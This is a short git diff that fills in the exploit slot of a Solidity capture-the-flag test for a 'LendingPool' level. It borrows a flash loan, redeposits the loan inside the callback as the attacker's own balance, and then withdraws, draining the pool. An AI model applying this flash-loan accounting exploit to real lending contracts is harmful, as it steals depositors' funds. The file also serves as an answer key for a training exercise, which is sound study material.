@@ -5,8 +5,12 @@ import "./BaseTest.t.sol";
 import "src/08_LendingPool/LendingPool.sol";
 
 // forge test --match-contract LendingPoolTest -vvvv
-contract LendingPoolTest is BaseTest {
+contract LendingPoolTest is BaseTest, IFlashLoanReceiver {
     LendingPool instance;
+
+    function execute() external override payable {
+        instance.deposit{value: 0.1 ether}();
+    }
 
     function setUp() public override {
         super.setUp();
@@ -14,7 +18,8 @@ contract LendingPoolTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.flashLoan(0.1 ether);
+        instance.withdraw();
 
         checkSuccess();
     }
